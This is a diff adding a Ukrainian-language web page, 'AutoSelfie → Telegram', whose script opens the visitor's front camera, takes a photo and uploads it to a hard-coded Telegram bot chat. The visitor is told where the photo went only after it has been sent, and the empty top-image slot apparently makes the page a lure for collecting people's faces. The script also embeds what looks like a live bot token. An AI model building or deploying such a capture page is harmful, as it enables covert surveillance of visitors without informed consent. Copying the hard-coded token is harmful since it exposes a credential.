@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="utf-8" />
+  <title>AutoSelfie → Telegram</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{
+      font-family:system-ui,Segoe UI,Roboto,Arial;
+      background:#0f1720;
+      color:#e6eef8;
+      display:flex;
+      justify-content:center;
+      padding:20px;
+    }
+    .card{
+      background:#0b1220;
+      border:1px solid #1f2a3a;
+      padding:18px;
+      border-radius:12px;
+      max-width:820px;
+      width:100%;
+      box-sizing:border-box;
+    }
+    header img{
+      max-width:100%;
+      border-radius:10px;
+      margin-bottom:12px;
+    }
+    button{
+      padding:12px 18px;
+      border-radius:8px;
+      border:none;
+      background:#2563eb;
+      color:#fff;
+      font-size:16px;
+      cursor:pointer;
+      width:100%;
+      margin:12px 0;
+    }
+    button:disabled{
+      opacity:.6;
+      cursor:default;
+    }
+    video{
+      width:100%;
+      max-width:480px;
+      border-radius:10px;
+      background:#000;
+      display:none;
+    }
+    canvas{
+      width:100%;
+      max-width:480px;
+      border-radius:10px;
+      background:#000;
+      display:none;
+      margin-top:12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+
+    <!-- Статична картинка зверху -->
+    <header>
+      <img id="topImage" src="" alt="Статична картинка">
+    </header>
+
+    <button id="actionBtn">Надати доступ до камери</button>
+
+    <!-- Живе відео -->
+    <video id="video" autoplay playsinline muted></video>
+
+    <!-- Відображення знятого фото -->
+    <canvas id="canvas"></canvas>
+
+  </div>
+
+  <script>
+    // ====== ТВОЇ ДАНІ ======
+    const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
+    const CHAT_ID = "1178810140";
+
+    // Статична картинка (встав сюди URL або data URI)
+    const IMAGE_SRC = ""; 
+    // ========================
+
+    const actionBtn = document.getElementById('actionBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const topImage = document.getElementById('topImage');
+
+    if (IMAGE_SRC) topImage.src = IMAGE_SRC;
+    else topImage.style.display = "none";
+
+    let stream = null;
+    let cameraReady = false;
+
+    function isSecure(){
+      return location.protocol === 'https:' || location.hostname === 'localhost';
+    }
+
+    async function stopStream(){
+      if(stream){
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      video.srcObject = null;
+    }
+
+    async function startCamera(){
+      if(!isSecure()){
+        alert("Потрібен HTTPS або localhost");
+        return;
+      }
+
+      try{
+        stream = await navigator.mediaDevices.getUserMedia({
+          video:{ facingMode:"user" },
+          audio:false
+        });
+        video.srcObject = stream;
+        await video.play();
+        video.style.display = "block";
+        cameraReady = true;
+        actionBtn.textContent = "Зробити фото";
+      }catch(e){
+        alert("Не вдалося отримати доступ до камери");
+      }
+    }
+
+    async function takePhoto(){
+      if(!cameraReady) return;
+
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+
+      canvas.width = w;
+      canvas.height = h;
+
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, w, h);
+
+      canvas.style.display = "block";
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", blob, "selfie.png");
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+      try{
+        await fetch(url, { method:"POST", body:form });
+        alert("Фото відправлено в Telegram");
+      }catch(e){
+        alert("Помилка відправки. Можливо CORS.");
+      }
+
+      await stopStream();
+      cameraReady = false;
+      actionBtn.textContent = "Зробити фото";
+    }
+
+    actionBtn.addEventListener("click", async () => {
+      if(!cameraReady){
+        // Крок 1: надати доступ
+        await startCamera();
+      }else{
+        // Крок 2: зробити фото
+        await takePhoto();
+      }
+    });
+  </script>
+</body>
+</html>
